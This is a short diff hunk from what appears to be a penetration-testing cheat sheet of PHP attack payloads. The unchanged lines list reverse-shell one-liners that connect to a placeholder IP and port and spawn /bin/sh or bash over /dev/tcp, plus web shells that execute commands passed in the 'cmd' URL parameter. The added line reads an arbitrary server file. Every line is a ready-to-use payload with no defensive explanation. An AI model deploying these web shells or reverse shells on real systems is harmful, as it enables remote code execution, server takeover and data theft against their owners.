@@ -52,6 +52,7 @@ php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
 var = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/IP/PORT 0>&1\'"); ?>';
 
+<?php echo file_get_contents('FILE_TO_READ'); ?> 
 <?php system("<bash-shell>") ?>
 <?php echo system($_GET["cmd"]); ?> || <?php system($_GET['cmd']);?> || <?php exec("whoami"); ?>
 <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
